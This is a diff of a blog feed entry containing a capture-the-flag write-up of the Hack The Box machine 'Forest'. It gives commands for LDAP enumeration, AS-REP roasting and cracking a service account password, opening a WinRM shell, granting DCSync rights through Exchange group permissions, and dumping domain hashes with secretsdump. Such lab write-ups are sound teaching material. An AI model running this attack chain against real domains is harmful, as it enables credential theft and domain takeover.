@@ -7,91 +7,95 @@ related and try to get into the details of the included misconfigurations and vu
 &lt;p>For this writeup I am looking at Forest from HTB. There are many writeups on this so I will use them as references for learning.&lt;/p>
 &lt;h2 id="enumeration">Enumeration&lt;/h2>
 &lt;p>Open ports as found by nmap.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 10.10.10.161
-Host is up &lt;span style="color:#f92672">(&lt;/span>0.20s latency&lt;span style="color:#f92672">)&lt;/span>.
-PORT STATE SERVICE VERSION
-53/tcp open domain Simple DNS Plus
-88/tcp open kerberos-sec Microsoft Windows Kerberos &lt;span style="color:#f92672">(&lt;/span>server time: 2022-02-25 16:32:33Z&lt;span style="color:#f92672">)&lt;/span>
-135/tcp open msrpc Microsoft Windows RPC
-139/tcp open netbios-ssn Microsoft Windows netbios-ssn
-389/tcp open ldap Microsoft Windows Active Directory LDAP &lt;span style="color:#f92672">(&lt;/span>Domain: htb.local, Site: Default-First-Site-Name&lt;span style="color:#f92672">)&lt;/span>
-445/tcp open microsoft-ds Windows Server &lt;span style="color:#ae81ff">2016&lt;/span> Standard &lt;span style="color:#ae81ff">14393&lt;/span> microsoft-ds &lt;span style="color:#f92672">(&lt;/span>workgroup: HTB&lt;span style="color:#f92672">)&lt;/span>
-464/tcp open kpasswd5?
-593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
-636/tcp open tcpwrapped
-3268/tcp open ldap Microsoft Windows Active Directory LDAP &lt;span style="color:#f92672">(&lt;/span>Domain: htb.local, Site: Default-First-Site-Name&lt;span style="color:#f92672">)&lt;/span>
-3269/tcp open tcpwrapped
-5985/tcp open http Microsoft HTTPAPI httpd 2.0 &lt;span style="color:#f92672">(&lt;/span>SSDP/UPnP&lt;span style="color:#f92672">)&lt;/span>
-|_http-title: Not Found
-|_http-server-header: Microsoft-HTTPAPI/2.0
-9389/tcp open mc-nmf .NET Message Framing
-47001/tcp open http Microsoft HTTPAPI httpd 2.0 &lt;span style="color:#f92672">(&lt;/span>SSDP/UPnP&lt;span style="color:#f92672">)&lt;/span>
-|_http-title: Not Found
-|_http-server-header: Microsoft-HTTPAPI/2.0
-49664/tcp open msrpc Microsoft Windows RPC
-49665/tcp open msrpc Microsoft Windows RPC
-49666/tcp open msrpc Microsoft Windows RPC
-49667/tcp open msrpc Microsoft Windows RPC
-49671/tcp open msrpc Microsoft Windows RPC
-49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
-49677/tcp open msrpc Microsoft Windows RPC
-49684/tcp open msrpc Microsoft Windows RPC
-49703/tcp open msrpc Microsoft Windows RPC
-49945/tcp open msrpc Microsoft Windows RPC
-Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
-Host script results:
-| smb2-time:
-| date: 2022-02-25T16:33:28
-|_ start_date: 2022-02-25T16:25:55
-| smb2-security-mode:
-| 3.1.1:
-|_ Message signing enabled and required
-| smb-security-mode:
-| account_used: &amp;lt;blank&amp;gt;
-| authentication_level: user
-| challenge_response: supported
-|_ message_signing: required
-|_clock-skew: mean: 2h52m14s, deviation: 4h37m09s, median: 12m13s
-| smb-os-discovery:
-| OS: Windows Server &lt;span style="color:#ae81ff">2016&lt;/span> Standard &lt;span style="color:#ae81ff">14393&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Windows Server &lt;span style="color:#ae81ff">2016&lt;/span> Standard 6.3&lt;span style="color:#f92672">)&lt;/span>
-| Computer name: FOREST
-| NetBIOS computer name: FOREST&lt;span style="color:#ae81ff">\x&lt;/span>&lt;span style="color:#ae81ff">00&lt;/span>
-| Domain name: htb.local
-| Forest name: htb.local
-| FQDN: FOREST.htb.local
-|_ System time: 2022-02-25T08:33:27-08:00
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>From the results we see some notable ports (88,389) that point to us that this is a domain controller. From ldap we see the domain is &lt;strong>htb.local&lt;/strong> and
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 10.10.10.161
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#f92672">(&lt;/span>0.20s latency&lt;span style="color:#f92672">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>53/tcp open domain Simple DNS Plus
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>88/tcp open kerberos-sec Microsoft Windows Kerberos &lt;span style="color:#f92672">(&lt;/span>server time: 2022-02-25 16:32:33Z&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>135/tcp open msrpc Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>389/tcp open ldap Microsoft Windows Active Directory LDAP &lt;span style="color:#f92672">(&lt;/span>Domain: htb.local, Site: Default-First-Site-Name&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>445/tcp open microsoft-ds Windows Server &lt;span style="color:#ae81ff">2016&lt;/span> Standard &lt;span style="color:#ae81ff">14393&lt;/span> microsoft-ds &lt;span style="color:#f92672">(&lt;/span>workgroup: HTB&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>464/tcp open kpasswd5?
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>636/tcp open tcpwrapped
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>3268/tcp open ldap Microsoft Windows Active Directory LDAP &lt;span style="color:#f92672">(&lt;/span>Domain: htb.local, Site: Default-First-Site-Name&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>3269/tcp open tcpwrapped
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>5985/tcp open http Microsoft HTTPAPI httpd 2.0 &lt;span style="color:#f92672">(&lt;/span>SSDP/UPnP&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Not Found
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Microsoft-HTTPAPI/2.0
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>9389/tcp open mc-nmf .NET Message Framing
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>47001/tcp open http Microsoft HTTPAPI httpd 2.0 &lt;span style="color:#f92672">(&lt;/span>SSDP/UPnP&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Not Found
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Microsoft-HTTPAPI/2.0
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49664/tcp open msrpc Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49665/tcp open msrpc Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49666/tcp open msrpc Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49667/tcp open msrpc Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49671/tcp open msrpc Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49677/tcp open msrpc Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49684/tcp open msrpc Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49703/tcp open msrpc Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49945/tcp open msrpc Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host script results:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| smb2-time:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| date: 2022-02-25T16:33:28
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ start_date: 2022-02-25T16:25:55
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| smb2-security-mode:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| 3.1.1:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Message signing enabled and required
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| smb-security-mode:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| account_used: &amp;lt;blank&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| authentication_level: user
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| challenge_response: supported
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ message_signing: required
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_clock-skew: mean: 2h52m14s, deviation: 4h37m09s, median: 12m13s
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| smb-os-discovery:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| OS: Windows Server &lt;span style="color:#ae81ff">2016&lt;/span> Standard &lt;span style="color:#ae81ff">14393&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Windows Server &lt;span style="color:#ae81ff">2016&lt;/span> Standard 6.3&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Computer name: FOREST
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| NetBIOS computer name: FOREST&lt;span style="color:#ae81ff">\x&lt;/span>&lt;span style="color:#ae81ff">00&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Domain name: htb.local
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Forest name: htb.local
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| FQDN: FOREST.htb.local
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ System time: 2022-02-25T08:33:27-08:00
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>From the results we see some notable ports (88,389) that point to us that this is a domain controller. From ldap we see the domain is &lt;strong>htb.local&lt;/strong> and
 from smb the computer name is &lt;strong>FOREST&lt;/strong>.&lt;/p>
 &lt;h3 id="ldap-null-bind">LDAP Null bind&lt;/h3>
 &lt;p>LDAP null bind is allowed on this machine allowing us to make ldap queries without authentication. Something to note this is not a default configuration
 for Windows AD, you have to set this up manually.&lt;/p>
 &lt;p>By running nmap ldap scripts against the machine alot of the ldap information is dumped. I have cut most off the output.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 10.10.10.161
-Host is up &lt;span style="color:#f92672">(&lt;/span>0.20s latency&lt;span style="color:#f92672">)&lt;/span>.
-PORT STATE SERVICE VERSION
-389/tcp open ldap Microsoft Windows Active Directory LDAP &lt;span style="color:#f92672">(&lt;/span>Domain: htb.local, Site: Default-First-Site-Name&lt;span style="color:#f92672">)&lt;/span>
-| ldap-search:
-| Context: DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
-| dn: DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
-| objectClass: top
-| objectClass: domain
-| objectClass: domainDNS
-| distinguishedName: DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
-| instanceType: &lt;span style="color:#ae81ff">5&lt;/span>
-| whenCreated: 2019/09/18 17:45:49 UTC
-| whenChanged: 2022/02/25 16:25:45 UTC
-| subRefs: DC&lt;span style="color:#f92672">=&lt;/span>ForestDnsZones,DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
-| subRefs: DC&lt;span style="color:#f92672">=&lt;/span>DomainDnsZones,DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
-| subRefs: CN&lt;span style="color:#f92672">=&lt;/span>Configuration,DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
---- snip ---
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can also confirm this using ldapsearch and we see all ldap information.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ldapsearch -h 10.10.10.161 -x -b &lt;span style="color:#e6db74">&amp;#34;DC=htb,DC=local&amp;#34;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 10.10.10.161
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#f92672">(&lt;/span>0.20s latency&lt;span style="color:#f92672">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>389/tcp open ldap Microsoft Windows Active Directory LDAP &lt;span style="color:#f92672">(&lt;/span>Domain: htb.local, Site: Default-First-Site-Name&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ldap-search:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Context: DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| dn: DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| objectClass: top
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| objectClass: domain
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| objectClass: domainDNS
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| distinguishedName: DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| instanceType: &lt;span style="color:#ae81ff">5&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| whenCreated: 2019/09/18 17:45:49 UTC
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| whenChanged: 2022/02/25 16:25:45 UTC
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| subRefs: DC&lt;span style="color:#f92672">=&lt;/span>ForestDnsZones,DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| subRefs: DC&lt;span style="color:#f92672">=&lt;/span>DomainDnsZones,DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| subRefs: CN&lt;span style="color:#f92672">=&lt;/span>Configuration,DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>--- snip ---
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can also confirm this using ldapsearch and we see all ldap information.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ldapsearch -h 10.10.10.161 -x -b &lt;span style="color:#e6db74">&amp;#34;DC=htb,DC=local&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/forest/forest1.png" class="center" style="border-radius: 8px;" />
 &lt;p>Since the output is quite verbose and not easy to digest I&amp;rsquo;ll use &lt;strong>windapsearch&lt;/strong> which is a nicer tool that helps with ldap information.&lt;/p>
 &lt;h4 id="users">Users&lt;/h4>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">windapsearch -d htb.local --dc 10.10.10.161 -m users --attrs samaccountname | grep -i samaccountname | awk &lt;span style="color:#e6db74">&amp;#39;{print $2}&amp;#39;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>SM_ca8c2ed5bdab4dc9b
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>windapsearch -d htb.local --dc 10.10.10.161 -m users --attrs samaccountname | grep -i samaccountname | awk &lt;span style="color:#e6db74">&amp;#39;{print $2}&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>SM_ca8c2ed5bdab4dc9b
 SM_75a538d3025e4db9a
 $331000-VK4ADACQNUCA
 SM_2c8eef0a09b545acb
@@ -120,8 +124,8 @@ andy
 HealthMailboxfd87238
 sebastien
 &lt;/code>&lt;/pre>&lt;h4 id="computers">Computers&lt;/h4>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">windapsearch -d htb.local --dc 10.10.10.161 -m computers
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>dn: CN=FOREST,OU=Domain Controllers,DC=htb,DC=local
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>windapsearch -d htb.local --dc 10.10.10.161 -m computers
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>dn: CN=FOREST,OU=Domain Controllers,DC=htb,DC=local
 cn: FOREST
 operatingSystem: Windows Server 2016 Standard
 operatingSystemVersion: 10.0 (14393)
@@ -132,8 +136,8 @@ operatingSystem: Windows Server 2016 Standard
 operatingSystemVersion: 10.0 (14393)
 dNSHostName: EXCH01.htb.local
 &lt;/code>&lt;/pre>&lt;h4 id="groups">Groups&lt;/h4>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">windapsearch -d htb.local --dc 10.10.10.161 -m groups | grep cn | awk -F&lt;span style="color:#ae81ff">\:&lt;/span> &lt;span style="color:#e6db74">&amp;#39;{print $2}&amp;#39;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>--- snip ---
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>windapsearch -d htb.local --dc 10.10.10.161 -m groups | grep cn | awk -F&lt;span style="color:#ae81ff">\:&lt;/span> &lt;span style="color:#e6db74">&amp;#39;{print $2}&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>--- snip ---
 Key Admins
 Enterprise Key Admins
 Organization Management
@@ -164,18 +168,18 @@ Exchange server in the domain, keep this in mind it will be important later.&lt;
 &lt;p>This attack has been well covered on other posts online, I&amp;rsquo;ll list ones that I like as references.&lt;/p>
 &lt;p>We&amp;rsquo;ll use GetNPUsers script from impacket to perform the attack. This script also makes ldap queries to identify users vulnerable to
 the attack.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">GetNPUsers.py -request -dc-ip 10.10.10.161 htb.local/
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>GetNPUsers.py -request -dc-ip 10.10.10.161 htb.local/
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/forest/forest2.png" class="center" style="border-radius: 8px;" />
 &lt;p>Using the output, I was able to crack the hash with john and get the user&amp;rsquo;s password.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">john --wordlist&lt;span style="color:#f92672">=&lt;/span>/usr/share/wordlists/rockyou.txt svc-alfresco.txt
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>svc-alfresco : s3rvice&lt;/strong>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>john --wordlist&lt;span style="color:#f92672">=&lt;/span>/usr/share/wordlists/rockyou.txt svc-alfresco.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>svc-alfresco : s3rvice&lt;/strong>&lt;/p>
 &lt;h2 id="shell-as-svc-alfresco">Shell as svc-alfresco&lt;/h2>
 &lt;p>With the discovered credentials we can get a shell, to confirm that we can use this user to get a shell I will use crackmapexec.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/forest/forest3.png" class="center" style="border-radius: 8px;" />
 &lt;p>CME confirms we can connect via winrm.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>Once we have a shell we can look at group memberships for this account.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Once we have a shell we can look at group memberships for this account.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/forest/forest4.png" class="center" style="border-radius: 8px;" />
 &lt;p>From the output we see we are part of several interesting non-default groups.&lt;/p>
 &lt;ol>
@@ -225,34 +229,46 @@ is installed, the Exchange Windows Permissions Group has WriteDACL access to the
 &lt;p>Now we can chain these two issues to compromise the domain.&lt;/p>
 &lt;h2 id="owning-the-domain">Owning the Domain&lt;/h2>
 &lt;p>First we&amp;rsquo;ll use our Account Operator privileges as svc-alfresco to create an account and add it the Exchange Windows Permissions Group.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">net user pwned &lt;span style="color:#e6db74">&amp;#39;Pwn3d!!&amp;#39;&lt;/span> /add
-net group &lt;span style="color:#e6db74">&amp;#34;Exchange Windows Permissions&amp;#34;&lt;/span> pwned /add
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can then upload PowerView and use it to grant DCSync privileges to the newly created account.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>net user pwned &lt;span style="color:#e6db74">&amp;#39;Pwn3d!!&amp;#39;&lt;/span> /add
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>net group &lt;span style="color:#e6db74">&amp;#34;Exchange Windows Permissions&amp;#34;&lt;/span> pwned /add
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can then upload PowerView and use it to grant DCSync privileges to the newly created account.&lt;/p>
 &lt;p>The below commands will allow powerview to use the credentials of the new account to grant the privileges on that account.
 We could also use the svc-alfresco account if we wanted.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">$SecPassword &lt;span style="color:#f92672">=&lt;/span> ConvertTo-SecureString &lt;span style="color:#e6db74">&amp;#39;Pwn3d!!&amp;#39;&lt;/span> -AsPlainText -Force
-$Cred &lt;span style="color:#f92672">=&lt;/span> New-Object System.Management.Automation.PSCredential&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#39;htb.local\pwned&amp;#39;&lt;/span>, $SecPassword&lt;span style="color:#f92672">)&lt;/span>
-Add-DomainObjectAcl -Credential $Cred -TargetDomain htb.local -PrincipalIdentity &lt;span style="color:#e6db74">&amp;#39;pwned&amp;#39;&lt;/span> -Rights DCSync
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>With that being successful, we can perform DCSync with secretsdump impacket script and get the administrator hash.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">secretsdump.py htb.local/pwned:&lt;span style="color:#e6db74">&amp;#39;Pwn3d!!&amp;#39;&lt;/span>@10.10.10.161
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>$SecPassword &lt;span style="color:#f92672">=&lt;/span> ConvertTo-SecureString &lt;span style="color:#e6db74">&amp;#39;Pwn3d!!&amp;#39;&lt;/span> -AsPlainText -Force
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$Cred &lt;span style="color:#f92672">=&lt;/span> New-Object System.Management.Automation.PSCredential&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#39;htb.local\pwned&amp;#39;&lt;/span>, $SecPassword&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Add-DomainObjectAcl -Credential $Cred -TargetDomain htb.local -PrincipalIdentity &lt;span style="color:#e6db74">&amp;#39;pwned&amp;#39;&lt;/span> -Rights DCSync
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>With that being successful, we can perform DCSync with secretsdump impacket script and get the administrator hash.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>secretsdump.py htb.local/pwned:&lt;span style="color:#e6db74">&amp;#39;Pwn3d!!&amp;#39;&lt;/span>@10.10.10.161
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/forest/forest9.png" class="center" style="border-radius: 8px;" />
 &lt;p>We can then use the admin hash to get a shell.&lt;/p>
 &lt;h2 id="extras">Extras&lt;/h2>
 &lt;p>Todo - LDAP queries&lt;/p>
